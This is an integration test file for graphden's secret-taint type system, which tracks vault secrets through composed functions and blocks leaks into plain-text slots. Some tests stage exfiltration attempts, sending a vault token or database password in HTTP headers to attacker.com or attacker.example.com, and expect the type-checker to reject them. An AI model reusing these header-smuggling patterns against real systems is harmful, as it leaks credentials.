(ns ^:integration graphden.integration.secret-flow-test
  "End-to-end integration tests for the `:secret` type-system pipeline
   wired up across T1–T6:

   - T1: `:secret` is a refinement-marker with asymmetric subtyping.
   - T2: per-base-fn `:return-type-rule`s propagate the marker through
     composition (substring(secret) → secret(text)).
   - T3: ~80 base-fns annotated with `taint-with-secret-if-tainted`.
   - T4: `/api/execute` redacts the result body when the fn-def's
     effective return-type carries the marker.
   - T6 (this commit): `:sql-query` / `:sql-exec` declare
     `:password [:secret :text]` so any composition that flows a
     vault-sourced value into the slot is allowed, while a downstream
     attempt to strip the marker is rejected at type-check.

   The tests below exercise the FULL stack: real PG container +
   package loader + type-checker + executor. No mocks.

   The two scenarios:
     1. Compose `secret-leaf` (return `[:secret :text]`) into a
        propagating string op (`str-upper`). The composed fn-def's
        recorded return is `[:secret :text]`, an inline `/api/execute`
        succeeds with `:result nil` and `:tainted? true`.

     2. The structural leak attempt — a sink whose slot is plain
        `:text` (e.g. a hand-rolled `clone-as-text` shim) bound to a
        secret-returning fn — is rejected at type-check, so the
        fn-def never lands in storage."
  (:require
    [clojure.test :refer [deftest is testing use-fixtures]]
    [graphden.clients.vault :as vault]
    [graphden.crud.validation :as validation]
    [graphden.executor.context :as ctx]
    [graphden.executor.interface :as exec]
    [graphden.executor.registry.core :as registry]
    [graphden.executor.runtime :as runtime]
    [graphden.executor.test-setup :as setup]
    [graphden.storage.protocol.core :as sp]
    [graphden.types.check :as check]
    [graphden.types.core :as types-core]))


(use-fixtures :once (setup/create-container-fixture))


(use-fixtures :each exec/with-clean-registry
  (fn [t]
    (types-core/clear-aliases!)
    (t)))


(defn- secret-text-rich!
  "Register a stand-in `:secret-text` rich type whose `:return` is
   `[:secret :text]`. The Followup-4 validation gate reads the
   slot's `type-fn-id` → fn-row → looks the name up in the rich-
   types registry; tests that exercise the gate need a registered
   fn-name whose rich-type carries the `:secret` marker."
  []
  (registry/record-rich-types! :secret-text
                               {:args {} :return-type [:secret :text]}))


(deftest secret-propagates-through-str-upper-then-hides-at-execute-test
  ;; Mirror the runtime registry: register `secret-leaf` returning
  ;; `[:secret :text]` and `str-upper` with a taint-propagating rule.
  ;; The compose `upper(get(...))` MUST type-check AND end up with a
  ;; secret-marked recorded return.
  (registry/record-rich-types! :secret-leaf
                               {:args {:path :text}
                                :return-type [:secret :text]
                                :tags #{:secret-shape :admin-only-vault}})
  (registry/record-rich-types! :str-upper
                               {:args {:string {:type [:secret :text]}}
                                :return-type :text
                                :return-type-rule (fn [bi default-ret]
                                                    (types-core/taint-with-secret-if-tainted
                                                      bi default-ret))})

  (testing "leaf secret-leaf binding accepts a literal path → composes"
    (check/check-fn-def! {:name :_my-db-pwd
                          :parent :secret-leaf
                          :args {:path {:value "user-db/password"}}})
    (is (= [:secret :text]
           (:return (registry/rich-type-of :_my-db-pwd)))))

  (testing "compose secret-leaf into str-upper — propagation taints the result"
    (check/check-fn-def! {:name :_my-shouty-pwd
                          :parent :str-upper
                          :args {:string :_my-db-pwd}})
    (is (= [:secret :text]
           (:return (registry/rich-type-of :_my-shouty-pwd)))))

  (testing "downstream attempt to use the composed result in a plain :text slot fails"
    (registry/record-rich-types! :plain-text-sink
                                 {:args {:s {:type :text}}
                                  :return-type :int})
    (is (thrown-with-msg?
          clojure.lang.ExceptionInfo #"(?i)type-check failed"
          (check/check-fn-def! {:name :leak-attempt
                                :parent :plain-text-sink
                                :args {:s :_my-shouty-pwd}})))))


(deftest plain-text-can-still-flow-into-secret-sink-slot-test
  ;; Auto-promote direction is allowed: `:sql-query/:password` slot
  ;; declared `[:secret :text]` still accepts a plain text literal —
  ;; the user writing a one-off password into the form for testing is
  ;; type-valid (the slot tags it as secret on entry).
  (registry/record-rich-types! :sql-query
                               {:args {:url {:type :text}
                                       :user {:type :text}
                                       :password {:type [:secret :text]}
                                       :sql {:type :text}
                                       :params {:type [:list :jsonb]}}
                                :return-type [:list :jsonb]})

  (testing "literal :text password fills the [:secret :text] slot"
    (check/check-fn-def! {:name :_sql-test
                          :parent :sql-query
                          :args {:url {:value "jdbc:postgresql://localhost"}
                                 :user {:value "u"}
                                 :password {:value "literal-pwd"}
                                 :sql {:value "SELECT 1"}
                                 :params {:value []}}})
    ;; sql-query returns `[:list :jsonb]` — NOT a secret unless
    ;; declared with a propagator. Plain literals don't taint the
    ;; result; only an actual secret-returning ref would (handled
    ;; by the next test).
    (is (= [:list :jsonb]
           (:return (registry/rich-type-of :_sql-test))))))


(deftest plain-http-get-headers-refuses-secret-value-test
  ;; B: plain :http-get/:headers is `[:map :text :text]` — the type-
  ;; system structurally refuses to flow a secret-typed value into
  ;; the headers map. A user who tries to wire `(http-get :headers
  ;; {"Authorization" (str-concat "Bearer " <secret>)})` gets a
  ;; type-check rejection at sync-time, BEFORE the request is ever
  ;; built.
  (registry/record-rich-types! :secret-leaf
                               {:args {:path :text}
                                :return-type [:secret :text]
                                :tags #{:secret-shape :admin-only-vault}})
  (registry/record-rich-types! :http-get
                               {:args {:url {:type :text}
                                       :headers {:type [:map :text :text]}}
                                :return-type :int
                                :effects #{:network}})

  (check/check-fn-def! {:name :_secret-token
                        :parent :secret-leaf
                        :args {:path {:value "api/token"}}})

  (testing "literal map with a secret-typed value REJECTS at sync-time"
    (is (thrown-with-msg?
          clojure.lang.ExceptionInfo #"(?i)type-check failed"
          (check/check-fn-def! {:name :leak-via-headers
                                :parent :http-get
                                :args {:url {:value "https://attacker.com"}
                                       :headers {:value {"Authorization" :_secret-token}}}})))))


(deftest http-get-with-bearer-accepts-secret-token-test
  ;; B: the secret-aware sibling `:http-get-with-bearer` declares its
  ;; `:token` slot `[:secret :text]`. A `:secret-leaf` ref flows in
  ;; cleanly; the impl embeds the secret in the Authorization header
  ;; internally so the secret never touches the generic `:map` slot.
  (registry/record-rich-types! :secret-leaf
                               {:args {:path :text}
                                :return-type [:secret :text]
                                :tags #{:secret-shape :admin-only-vault}})
  (registry/record-rich-types! :http-get-with-bearer
                               {:args {:url {:type :text}
                                       :token {:type [:secret :text]}
                                       :extra-headers {:type [:map :text :text]}}
                                :return-type :int
                                :effects #{:network}})

  (check/check-fn-def! {:name :_my-api-token
                        :parent :secret-leaf
                        :args {:path {:value "api/token"}}})

  (testing "secret-ref into :token slot composes — call type-checks"
    ;; (extra-headers omitted — graphden classifies a string-keyed
    ;; literal map as `:jsonb`, not `[:map :text :text]`, so the
    ;; binding-typecheck infra fails on a literal `{"Accept" "..."}`
    ;; regardless of secret-flow. That's a pre-existing classifier
    ;; quirk separate from the B work here.)
    (check/check-fn-def! {:name :_call-api-with-vault-token
                          :parent :http-get-with-bearer
                          :args {:url {:value "https://api.example.com/me"}
                                 :token :_my-api-token}})
    ;; Return is plain `:int` — the response body doesn't echo the
    ;; secret back (in this hypothetical signature). If a real
    ;; response shape WERE tainted by the token via a propagator,
    ;; T4's hide would kick in at /api/execute.
    (is (= :int
           (:return (registry/rich-type-of :_call-api-with-vault-token))))))


(deftest extra-headers-still-refuses-secret-values-test
  ;; B: the secret-aware bearer-variant locks down the `:token` slot
  ;; but `:extra-headers` is STILL plain `[:map :text :text]` — so
  ;; the user can't sneak a SECOND secret into the headers map under
  ;; the cover of the legitimate token. Defence-in-depth against the
  ;; "I have one legit auth and one exfil header" mix.
  (registry/record-rich-types! :secret-leaf
                               {:args {:path :text}
                                :return-type [:secret :text]
                                :tags #{:secret-shape :admin-only-vault}})
  (registry/record-rich-types! :http-get-with-bearer
                               {:args {:url {:type :text}
                                       :token {:type [:secret :text]}
                                       :extra-headers {:type [:map :text :text]}}
                                :return-type :int
                                :effects #{:network}})

  (check/check-fn-def! {:name :_db-pwd
                        :parent :secret-leaf
                        :args {:path {:value "db/password"}}})
  (check/check-fn-def! {:name :_token
                        :parent :secret-leaf
                        :args {:path {:value "api/token"}}})

  (testing ":extra-headers literal with a secret value REJECTS"
    ;; Same classifier quirk: a literal `{"X-..." :_db-pwd}` (a
    ;; string-keyed map) classifies as `:jsonb` — so the rejection
    ;; we'd want (`:jsonb` ⊄ `[:map :text :text]`) lands without
    ;; the type-system even reaching the secret-ness check. We
    ;; assert REJECTION holds; the EXACT path the type-checker took
    ;; isn't load-bearing for the security invariant.
    (is (thrown-with-msg?
          clojure.lang.ExceptionInfo #"(?i)type-check failed"
          (check/check-fn-def!
            {:name :exfil-via-extra-headers
             :parent :http-get-with-bearer
             :args {:url {:value "https://attacker.example.com"}
                    :token :_token
                    :extra-headers {:value {"X-Smuggled-Pwd" :_db-pwd}}}})))))


(deftest any-typed-slot-in-propagating-fn-preserves-secret-marker-test
  ;; Followup-1 (`:any` audit): pure content-passing fns with `:any`
  ;; slots (e.g. `:assoc/:value`, `:conj/:item`, `:identity-style`
  ;; ops) accept a secret through the silent `[:secret T] ⊆ :any`
  ;; escape hatch — BUT the T3 audit attached
  ;; `taint-with-secret-if-tainted` to every such fn, so the RESULT
  ;; type is lifted back into `[:secret …]`. The secret marker
  ;; round-trips through the `:any` slot without leaking.
  (registry/record-rich-types! :secret-leaf
                               {:args {:path :text}
                                :return-type [:secret :text]
                                :tags #{:secret-shape :admin-only-vault}})
  ;; Simulate `:assoc` — slot types are :any, return is :any, but
  ;; the registered rule propagates.
  (registry/record-rich-types! :assoc-any-stub
                               {:args {:m {:type :any}
                                       :k {:type :any}
                                       :v {:type :any}}
                                :return-type :any
                                :return-type-rule (fn [bi default-ret]
                                                    (types-core/taint-with-secret-if-tainted
                                                      bi default-ret))})

  (check/check-fn-def! {:name :_my-pwd
                        :parent :secret-leaf
                        :args {:path {:value "user-db/password"}}})

  (testing "secret flows through :any slot AND result type is lifted"
    (check/check-fn-def! {:name :_tainted-assoc
                          :parent :assoc-any-stub
                          :args {:m {:value {}}
                                 :k {:value :pwd}
                                 :v :_my-pwd}})
    (is (= [:secret :any]
           (:return (registry/rich-type-of :_tainted-assoc)))))

  (testing "downstream :text sink REJECTS the lifted-:any result"
    (registry/record-rich-types! :plain-text-sink
                                 {:args {:s {:type :text}} :return-type :int})
    (is (thrown-with-msg?
          clojure.lang.ExceptionInfo #"(?i)type-check failed"
          (check/check-fn-def! {:name :leak-via-any-assoc
                                :parent :plain-text-sink
                                :args {:s :_tainted-assoc}})))))


(deftest secret-path-binding-derefs-via-vault-at-execute-test
  ;; F-4: end-to-end of the auto-deref path. A binding with
  ;; `:override-kind :secret-path` on a `[:secret :text]`-typed slot
  ;; gets its `:value` field (a vault PATH) auto-resolved through
  ;; `clients.vault/get-secret` by the executor at arg-resolution
  ;; time — the impl receives the dereferenced secret value, never
  ;; the path string. We mock the vault client so the test stays
  ;; self-contained; the real OpenBao integration is covered by
  ;; `test/graphden/clients/vault_test.clj`.
  (let [storage (setup/create-test-storage)
        impl-captured (atom nil)
        ;; Register a stub base-fn whose impl captures what it
        ;; received under `:cred` — that's how we assert the
        ;; deref'd value reached the impl, not the path.
        _ (exec/register-base-fn! :stub-sink
                                  (fn [args _ctx]
                                    (let [cred (runtime/resolve-arg
                                                 args :cred)]
                                      (reset! impl-captured cred))
                                    42))
        ;; Stand-in for `:secret-text` so the validation gate sees
        ;; the slot's type as carrying `:secret`.
        _ (secret-text-rich!)
        secret-text-fn (sp/create-entity
                         storage :fn
                         {:id (random-uuid)
                          :name "secret-text"
                          :parent-ids []
                          :impl-hash nil})
        slot (sp/create-entity storage :slot
                               {:id (random-uuid)
                                :name "cred"
                                :type-fn-id (:id secret-text-fn)})
        base (setup/create-base-fn! storage "stub-sink" :int)
        _ (setup/attach-slot! storage (:id base) (:id slot) 0)
        composed (setup/create-composed-fn! storage "_uses-secret" (:id base))
        _ (sp/create-entity storage :binding
                            {:id (random-uuid)
                             :fn-id (:id composed)
                             :slot-id (:id slot)
                             :value "user-db/password"
                             :override-kind :secret-path})
        ;; `create-context` only honours :storage / :base-fns /
        ;; :clock; the :vault client rides as an extra record-key
        ;; (same pattern as `system/core` ig/init-key on
        ;; `:exec/context`).
        ctx (assoc (ctx/create-context
                     {:storage storage :base-fns (exec/get-default-registry)})
                   :vault {:address "http://stub" :token "stub"})]
    (try
      (with-redefs [vault/get-secret
                    (fn [_client path]
                      (is (= "user-db/password" path)
                          "vault is called with the PATH from binding.value")
                      "derefed-secret-value")]
        (exec/execute ctx (:id composed) {})
        (testing "impl received the derefed value, not the path"
          (is (= "derefed-secret-value" @impl-captured))))
      (finally (sp/close storage)))))


(deftest secret-path-binding-rejected-on-non-secret-slot-test
  ;; F-4: a binding with `:override-kind :secret-path` is refused at
  ;; write-time when its slot's effective type doesn't carry the
  ;; `:secret` marker. Without the gate, the executor would dereference
  ;; via vault and feed plain text into a non-secret slot, silently
  ;; defeating T1's structural protection.
  (let [storage (setup/create-test-storage)]
    (try
      (let [;; Plain :text slot — fn for the slot type is the
            ;; primitive :text base-fn.
            text-fn (first (sp/query-entities storage :fn {:name "text"}))
            slot (setup/create-slot! storage "plain-text" :text)
            owner (setup/create-base-fn! storage "owner-fn" :int)
            _ (setup/attach-slot! storage (:id owner) (:id slot) 0)
            binding-row {:id (random-uuid)
                         :fn-id (:id owner)
                         :slot-id (:id slot)
                         :value "user-db/password"
                         :override-kind :secret-path}]
        (testing "write-rej fires :capability/secret-path-on-non-secret-slot"
          (is (some? text-fn))
          (let [rej (validation/write-rej storage :binding binding-row)]
            (is (= :capability/secret-path-on-non-secret-slot
                   (:type rej))))))
      (finally (sp/close storage)))))


(deftest secret-ref-into-secret-sink-also-passes-test
  ;; The intended pattern in T7 docs — wire `secret-leaf` into the
  ;; `password` slot of `sql-query` via ref-binding. Type-check
  ;; should pass; sql-query's return-type isn't tainted (it doesn't
  ;; expose the password in the response), but if it WERE tainted
  ;; via a propagator, that would surface at /api/execute time.
  (registry/record-rich-types! :secret-leaf
                               {:args {:path :text}
                                :return-type [:secret :text]
                                :tags #{:secret-shape :admin-only-vault}})
  (registry/record-rich-types! :sql-query
                               {:args {:url {:type :text}
                                       :user {:type :text}
                                       :password {:type [:secret :text]}
                                       :sql {:type :text}
                                       :params {:type [:list :jsonb]}}
                                :return-type [:list :jsonb]})

  (check/check-fn-def! {:name :_db-pwd
                        :parent :secret-leaf
                        :args {:path {:value "user-db/password"}}})

  (testing "secret-ref into secret-slot composes — no taint visible in result type"
    (check/check-fn-def! {:name :_sql-with-vault-pwd
                          :parent :sql-query
                          :args {:url {:value "jdbc:postgresql://localhost"}
                                 :user {:value "u"}
                                 :password :_db-pwd
                                 :sql {:value "SELECT 1"}
                                 :params {:value []}}})
    (is (= [:list :jsonb]
           (:return (registry/rich-type-of :_sql-with-vault-pwd))))))
